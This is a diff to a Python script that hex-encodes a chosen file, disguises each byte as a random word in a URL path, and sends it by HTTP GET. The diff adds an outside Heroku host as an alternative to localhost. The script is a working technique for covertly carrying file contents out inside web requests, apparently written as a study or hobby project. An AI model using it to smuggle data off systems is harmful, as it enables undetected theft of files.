@@ -18,7 +18,8 @@ def msg_input():
             file = f.read().rstrip()
         msg_to_hex = binascii.hexlify(file.encode("utf-8"))
         print(f"{filepath} in hex bytes:", msg_to_hex)
-    return msg_to_hex
+    web_or_serv = input("Connect to the Server (S) or Website (W): ") #"Connect to the Server (S) or Website (W): "
+    return msg_to_hex, web_or_serv
 
 def randomised_word(msg_to_hex): #The function responsible for generating the word
     """Function splits the 2 character hex value for each byte and creates a word of length len(hex_char[i]) dynamically"""
@@ -41,7 +42,7 @@ def randomised_word(msg_to_hex): #The function responsible for generating the wo
     return hex_word, hex_wordlist
 
 if __name__ == "__main__":
-    input = msg_input()
+    input, web_or_serv = msg_input()
     hex_word, hex_wordlist = randomised_word(input) # words used to represent hex value length from 1-16
     payload = ''    #to replace the URI
     for position, hex_word in enumerate(hex_wordlist): 
@@ -54,8 +55,11 @@ if __name__ == "__main__":
                 payload += hex_word + f"{random.choice(file_type)}"
             else:
                 payload += hex_word + "/" # "/" separates the hex bytes
-
-    base_name = "http://locaLhost:9999/"
+    
+    if web_or_serv == "S":
+        base_name = "http://locaLhost:9999/"
+    else:
+        base_name = "http://frozen-ravine-68174.herokuapp.com/"
     url = base_name + payload 
     requests.get(url)
     print(requests.get(url))
